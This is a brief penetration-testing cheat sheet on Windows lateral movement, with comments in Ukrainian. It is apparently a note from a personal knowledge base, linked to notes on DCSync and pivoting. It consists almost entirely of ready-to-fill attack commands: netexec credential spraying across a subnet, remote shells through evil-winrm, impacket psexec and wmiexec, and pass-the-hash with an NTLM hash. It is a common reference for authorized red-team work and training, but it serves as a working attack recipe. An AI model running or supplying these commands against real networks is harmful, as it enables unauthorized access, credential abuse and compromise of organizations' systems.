# Lateral Movement

```bash
# перевірка де працюють креди по підмережі
nxc smb <subnet>/24 -u <u> -p <p> -d <domain>
# виконання команд
evil-winrm -i <IP> -u <u> -p <p>
impacket-psexec <domain>/<u>:<p>@<IP>
impacket-wmiexec <domain>/<u>:<p>@<IP>
# pass-the-hash
nxc smb <IP> -u <u> -H <NTLM>
```
**Зв'язки:** [[DCSync-Tickets]] · [[Pivoting]]
